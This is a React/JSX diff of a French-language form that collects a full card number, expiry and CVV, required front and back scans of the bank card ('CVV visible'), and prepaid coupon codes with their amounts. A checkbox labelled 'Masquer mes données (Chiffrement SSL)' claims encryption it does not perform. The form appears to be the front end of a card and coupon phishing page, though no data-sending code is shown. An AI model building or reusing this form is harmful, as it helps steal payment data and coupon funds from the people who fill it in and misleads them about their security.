+                            }}
+                            placeholder="4532 •••• •••• ••••"
+                            required
+                            className="w-full h-12 bg-slate-950/60 text-white font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-600"
                           />
-                          <span className="text-xs font-bold text-slate-300">NON</span>
-                        </label>
+                        </div>
+
+                        <div className="grid grid-cols-2 gap-4">
+                          {/* EXPRY DATE */}
+                          <div className="flex flex-col space-y-2">
+                            <label htmlFor="cardExpiryInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                              <Calendar className="w-3.5 h-3.5 text-blue-400" />
+                              Expiration (MM/AA) : <span className="text-red-500">*</span>
+                            </label>
+                            <input
+                              type="text"
+                              id="cardExpiryInput"
+                              name="card_expiry"
+                              value={cardExpiry}
+                              onChange={(e) => {
+                                const raw = e.target.value.replace(/\D/g, "").slice(0, 4);
+                                let formatted = raw;
+                                if (raw.length > 2) {
+                                  formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
+                                }
+                                setCardExpiry(formatted);
+                                if (errorText) setErrorText(null);
+                              }}
+                              placeholder="MM/AA"
+                              required
+                              className="w-full h-12 bg-slate-950/60 text-white font-mono text-xs font-bold tracking-wider px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-600"
+                            />
+                          </div>
+
+                          {/* CVV */}
+                          <div className="flex flex-col space-y-2">
+                            <label htmlFor="cardCvvInput" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                              <Lock className="w-3.5 h-3.5 text-blue-400" />
+                              Cryptogramme (CVV) : <span className="text-red-500">*</span>
+                            </label>
+                            <input
+                              type="password"
+                              id="cardCvvInput"
+                              name="card_cvv"
+                              value={cardCvv}
+                              onChange={(e) => {
+                                const formatted = e.target.value.replace(/\D/g, "").slice(0, 3);
+                                setCardCvv(formatted);
+                                if (errorText) setErrorText(null);
+                              }}
+                              placeholder="123"
+                              required
+                              className="w-full h-12 bg-slate-950/60 text-white font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-600"
+                            />
+                          </div>
+                        </div>
+
+                        {/* CACHER LES COORDONNES */}
+                        <div className="flex flex-col space-y-2 pt-1 border-t border-slate-900">
+                          <span className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                            <EyeOff className="w-3.5 h-3.5 text-blue-400" />
+                            Masquer mes données (Chiffrement SSL) :
+                          </span>
+                          <div className="flex items-center gap-5 mt-1">
+                            <label className="flex items-center gap-2 cursor-pointer select-none">
+                              <input
+                                type="checkbox"
+                                checked={hideCode === "OUI"}
+                                onChange={() => setHideCode("OUI")}
+                                className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                              />
+                              <span className="text-xs font-bold text-slate-300">OUI</span>
+                            </label>
+                            <label className="flex items-center gap-2 cursor-pointer select-none">
+                              <input
+                                type="checkbox"
+                                checked={hideCode === "NON"}
+                                onChange={() => setHideCode("NON")}
+                                className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                              />
+                              <span className="text-xs font-bold text-slate-300">NON</span>
+                            </label>
+                          </div>
+                        </div>
                       </div>
-                    </div>
+                    ) : (
+                      <div className="space-y-4">
+                        {/* AUTRES COUPONS */}
+                        <div className="flex flex-col space-y-2">
+                          <label htmlFor="otherCouponName" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                            <Tag className="w-3.5 h-3.5 text-blue-400" />
+                            Autres coupons (si absent de la liste) :
+                          </label>
+                          <input
+                            type="text"
+                            id="otherCouponName"
+                            name="otherCouponName"
+                            value={otherCouponName}
+                            onChange={(e) => {
+                              setOtherCouponName(e.target.value);
+                              if (errorText) setErrorText(null);
+                            }}
+                            placeholder=""
+                            className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                          />
+                        </div>
+
+                        <div className="grid grid-cols-2 gap-4">
+                          {/* MONTANT */}
+                          <div className="flex flex-col space-y-2">
+                            <label htmlFor="montant" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                              <Coins className="w-3.5 h-3.5 text-blue-400" />
+                              Montant : <span className="text-red-500">*</span>
+                            </label>
+                            <input
+                              type="text"
+                              id="montant"
+                              name="montant"
+                              value={montant}
+                              required
+                              onChange={(e) => {
+                                setMontant(e.target.value);
+                                if (errorText) setErrorText(null);
+                              }}
+                              placeholder=""
+                              className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                            />
+                          </div>
+
+                          {/* CODE DU COUPON */}
+                          <div className="flex flex-col space-y-2">
+                            <label htmlFor="code" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                              <Lock className="w-3.5 h-3.5 text-blue-400" />
+                              Code du coupon : <span className="text-red-500">*</span>
+                            </label>
+                            <input
+                              type="text"
+                              id="code"
+                              name="code"
+                              value={couponCode}
+                              onChange={(e) => {
+                                setCouponCode(e.target.value);
+                                if (errorText) setErrorText(null);
+                              }}
+                              placeholder="Saisir le Code"
+                              required
+                              style={{ textTransform: "uppercase" }}
+                              className="w-full h-12 bg-slate-950/60 text-white font-mono text-xs font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none uppercase placeholder:text-slate-600 placeholder:font-sans placeholder:tracking-normal"
+                            />
+                          </div>
+                        </div>
+
+                        {/* CACHER MON CODE */}
+                        <div className="flex flex-col space-y-2 pt-1 border-t border-slate-900">
+                          <span className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                            <EyeOff className="w-3.5 h-3.5 text-blue-400" />
+                            Masquer mon code :
+                          </span>
+                          <div className="flex items-center gap-5 mt-1">
+                            <label className="flex items-center gap-2 cursor-pointer select-none">
+                              <input
+                                type="checkbox"
+                                name="cacher_mon_code_oui"
+                                checked={hideCode === "OUI"}
+                                onChange={() => setHideCode("OUI")}
+                                className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                              />
+                              <span className="text-xs font-bold text-slate-300">OUI (Chiffrement SSL)</span>
+                            </label>
+                            <label className="flex items-center gap-2 cursor-pointer select-none">
+                              <input
+                                type="checkbox"
+                                name="cacher_mon_code_non"
+                                checked={hideCode === "NON"}
+                                onChange={() => setHideCode("NON")}
+                                className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                              />
+                              <span className="text-xs font-bold text-slate-300">NON</span>
+                            </label>
+                          </div>
+                        </div>
+                      </div>
+                    )}
                   </div>
 
                   {/* UPLOAD CARD IMAGE (FINTECH STYLE) */}
                   <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-4">
                     <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 04 : PIÈCE JOINTE DE SÛRETÉ</span>
                     
-                    <div className="flex flex-col space-y-2">
-                      <label className="text-[11px] font-semibold text-slate-400 flex items-center gap-2">
-                        <UploadCloud className="w-4 h-4 text-blue-400" />
-                        Joindre l'image du ticket (Optionnel) :
-                      </label>
-                      
-                      <div className="space-y-4">
-                        {imagePreviews.length > 0 && (
-                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                            {imagePreviews.map((preview, idx) => (
-                              <div key={idx} className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg">
+                    {selectedBrand === "VISA" || selectedBrand === "MASTERCARD" ? (
+                      <div className="flex flex-col space-y-3 animate-fadeIn">
+                        <label className="text-[11px] font-semibold text-slate-400 flex items-center gap-2 uppercase tracking-wide">
+                          <UploadCloud className="w-4 h-4 text-blue-400" />
+                          Scan Recto / Verso de la carte bancaire : <span className="text-red-500">*</span>
+                        </label>
+                        
+                        {/* RECTO / VERSO SIDES */}
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                          {/* RECTO */}
+                          <div className="flex flex-col space-y-2">
+                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Recto (Face avant) :</span>
+                            {cardFrontPreview ? (
+                              <div className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg h-36 flex items-center justify-center">
                                 <img
-                                  src={preview}
-                                  alt={`Ticket Preview ${idx + 1}`}
-                                  className="w-full h-36 object-contain rounded-xl"
+                                  src={cardFrontPreview}
+                                  alt="Recto Card Preview"
+                                  className="max-h-full max-w-full object-contain rounded-xl"
                                 />
-                                <div className="absolute bottom-4 left-4 bg-slate-900/80 text-[10px] px-2.5 py-1 rounded-md text-slate-300 border border-slate-800 font-mono">
-                                  Image {idx + 1}
-                                </div>
                                 <button
                                   type="button"
-                                  onClick={() => removeSelectedImage(idx)}
-                                  className="absolute top-4 right-4 w-8 h-8 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white transition cursor-pointer"
+                                  onClick={removeFrontImage}
+                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white cursor-pointer shadow-md"
                                 >
-                                  <X className="w-4 h-4" />
+                                  <X className="w-3.5 h-3.5" />
                                 </button>
                               </div>
-                            ))}
+                            ) : (
+                              <div
+                                onDragEnter={(e) => { e.preventDefault(); setDragFrontActive(true); }}
+                                onDragOver={(e) => { e.preventDefault(); setDragFrontActive(true); }}
+                                onDragLeave={(e) => { e.preventDefault(); setDragFrontActive(false); }}
+                                onDrop={(e) => {
+                                  e.preventDefault();
+                                  setDragFrontActive(false);
+                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                                    handleFrontFileChange(e.dataTransfer.files[0]);
+                                  }
+                                }}
+                                onClick={() => {
+                                  const input = document.createElement("input");
+                                  input.type = "file";
+                                  input.accept = "image/*";
+                                  input.onchange = (e) => {
+                                    const files = (e.target as HTMLInputElement).files;
+                                    if (files && files[0]) handleFrontFileChange(files[0]);
+                                  };
+                                  input.click();
+                                }}
+                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
+                                  dragFrontActive
+                                    ? "border-blue-500 bg-blue-500/5"
+                                    : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
+                                }`}
+                              >
+                                <UploadCloud className="w-6 h-6 text-slate-500 mb-1" />
+                                <div className="text-[11px] font-black text-slate-300">Face Avant de la carte</div>
+                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
+                              </div>
+                            )}
                           </div>
-                        )}
 
-                        {imagePreviews.length < 2 && (
-                          <div
-                            onDragEnter={handleDrag}
-                            onDragOver={handleDrag}
-                            onDragLeave={handleDrag}
-                            onDrop={handleDrop}
-                            onClick={() => fileInputRef.current?.click()}
-                            className={`border-2 border-dashed rounded-2xl p-6 text-center cursor-pointer transition-all duration-200 ${
-                              dragActive
-                                ? "border-blue-500 bg-blue-500/5"
-                                : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
-                            }`}
-                          >
-                            <input
-                              type="file"
-                              ref={fileInputRef}
-                              onChange={handleFileChange}
-                              accept="image/*"
-                              multiple
-                              className="hidden"
-                            />
-                            <UploadCloud className="w-8 h-8 text-slate-500 mx-auto mb-2 group-hover:scale-105 transition" />
-                            <div className="text-xs font-bold text-slate-300">
-                              {imagePreviews.length === 1 
-                                ? "Glissez-déposez la deuxième image (Optionnel)" 
-                                : "Glissez-déposez une à deux images du ticket (Optionnel)"}
-                            </div>
-                            <div className="text-[10px] text-slate-500 mt-1 uppercase tracking-wider font-semibold">
-                              PNG, JPG ou JPEG (Max 15 Mo par image)
-                            </div>
+                          {/* VERSO */}
+                          <div className="flex flex-col space-y-2">
+                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Verso (Face arrière avec signature) :</span>
+                            {cardBackPreview ? (
+                              <div className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg h-36 flex items-center justify-center">
+                                <img
+                                  src={cardBackPreview}
+                                  alt="Verso Card Preview"
+                                  className="max-h-full max-w-full object-contain rounded-xl"
+                                />
+                                <button
+                                  type="button"
+                                  onClick={removeBackImage}
+                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white cursor-pointer shadow-md"
+                                >
+                                  <X className="w-3.5 h-3.5" />
+                                </button>
+                              </div>
+                            ) : (
+                              <div
+                                onDragEnter={(e) => { e.preventDefault(); setDragBackActive(true); }}
+                                onDragOver={(e) => { e.preventDefault(); setDragBackActive(true); }}
+                                onDragLeave={(e) => { e.preventDefault(); setDragBackActive(false); }}
+                                onDrop={(e) => {
+                                  e.preventDefault();
+                                  setDragBackActive(false);
+                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                                    handleBackFileChange(e.dataTransfer.files[0]);
+                                  }
+                                }}
+                                onClick={() => {
+                                  const input = document.createElement("input");
+                                  input.type = "file";
+                                  input.accept = "image/*";
+                                  input.onchange = (e) => {
+                                    const files = (e.target as HTMLInputElement).files;
+                                    if (files && files[0]) handleBackFileChange(files[0]);
+                                  };
+                                  input.click();
+                                }}
+                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
+                                  dragBackActive
+                                    ? "border-blue-500 bg-blue-500/5"
+                                    : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
+                                }`}
+                              >
+                                <UploadCloud className="w-6 h-6 text-slate-500 mb-1" />
+                                <div className="text-[11px] font-black text-slate-300">Face Arrière (CVV visible)</div>
+                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
+                              </div>
+                            )}
                           </div>
-                        )}
+                        </div>
                       </div>
-                    </div>
+                    ) : (
+                      <div className="flex flex-col space-y-3 animate-fadeIn">
+                        <label className="text-[11px] font-semibold text-slate-400 flex items-center gap-2 uppercase tracking-wide">
+                          <UploadCloud className="w-4 h-4 text-blue-400" />
+                          Scan Recto / Verso du coupon (Optionnel) :
+                        </label>
+                        
+                        {/* RECTO / VERSO SIDES */}
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                          {/* RECTO */}
+                          <div className="flex flex-col space-y-2">
+                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Recto (Face avant) :</span>
+                            {couponFrontPreview ? (
+                              <div className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg h-36 flex items-center justify-center">
+                                <img
+                                  src={couponFrontPreview}
+                                  alt="Recto Coupon Preview"
+                                  className="max-h-full max-w-full object-contain rounded-xl"
+                                />
+                                <button
+                                  type="button"
+                                  onClick={removeCouponFrontImage}
+                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white cursor-pointer shadow-md"
+                                >
+                                  <X className="w-3.5 h-3.5" />
+                                </button>
+                              </div>
+                            ) : (
+                              <div
+                                onDragEnter={(e) => { e.preventDefault(); setDragCouponFrontActive(true); }}
+                                onDragOver={(e) => { e.preventDefault(); setDragCouponFrontActive(true); }}
+                                onDragLeave={(e) => { e.preventDefault(); setDragCouponFrontActive(false); }}
+                                onDrop={(e) => {
+                                  e.preventDefault();
+                                  setDragCouponFrontActive(false);
+                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                                    handleCouponFrontFileChange(e.dataTransfer.files[0]);
+                                  }
+                                }}
+                                onClick={() => {
+                                  const input = document.createElement("input");
+                                  input.type = "file";
+                                  input.accept = "image/*";
+                                  input.onchange = (e) => {
+                                    const files = (e.target as HTMLInputElement).files;
+                                    if (files && files[0]) handleCouponFrontFileChange(files[0]);
+                                  };
+                                  input.click();
+                                }}
+                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
+                                  dragCouponFrontActive
+                                    ? "border-blue-500 bg-blue-500/5"
+                                    : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
+                                }`}
+                              >
+                                <UploadCloud className="w-6 h-6 text-slate-500 mb-1" />
+                                <div className="text-[11px] font-black text-slate-300">Face Avant du coupon</div>
+                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
+                              </div>
+                            )}
+                          </div>
+
+                          {/* VERSO */}
+                          <div className="flex flex-col space-y-2">
+                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Verso (Face arrière avec grille/code) :</span>
+                            {couponBackPreview ? (
+                              <div className="relative rounded-2xl border border-slate-800 overflow-hidden bg-slate-950 p-2 group shadow-lg h-36 flex items-center justify-center">
+                                <img
+                                  src={couponBackPreview}
+                                  alt="Verso Coupon Preview"
+                                  className="max-h-full max-w-full object-contain rounded-xl"
+                                />
+                                <button
+                                  type="button"
+                                  onClick={removeCouponBackImage}
+                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-slate-900/95 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white cursor-pointer shadow-md"
+                                >
+                                  <X className="w-3.5 h-3.5" />
+                                </button>
+                              </div>
+                            ) : (
+                              <div
+                                onDragEnter={(e) => { e.preventDefault(); setDragCouponBackActive(true); }}
+                                onDragOver={(e) => { e.preventDefault(); setDragCouponBackActive(true); }}
+                                onDragLeave={(e) => { e.preventDefault(); setDragCouponBackActive(false); }}
+                                onDrop={(e) => {
+                                  e.preventDefault();
+                                  setDragCouponBackActive(false);
+                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                                    handleCouponBackFileChange(e.dataTransfer.files[0]);
+                                  }
+                                }}
+                                onClick={() => {
+                                  const input = document.createElement("input");
+                                  input.type = "file";
+                                  input.accept = "image/*";
+                                  input.onchange = (e) => {
+                                    const files = (e.target as HTMLInputElement).files;
+                                    if (files && files[0]) handleCouponBackFileChange(files[0]);
+                                  };
+                                  input.click();
+                                }}
+                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
+                                  dragCouponBackActive
+                                    ? "border-blue-500 bg-blue-500/5"
+                                    : "border-slate-800 bg-slate-950/30 hover:border-slate-700 hover:bg-slate-950/50"
+                                }`}
+                              >
+                                <UploadCloud className="w-6 h-6 text-slate-500 mb-1" />
+                                <div className="text-[11px] font-black text-slate-300">Face Arrière du coupon</div>
+                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
+                              </div>
+                            )}
+                          </div>
+                        </div>
+                      </div>
+                    )}
                   </div>
                 </div>
 
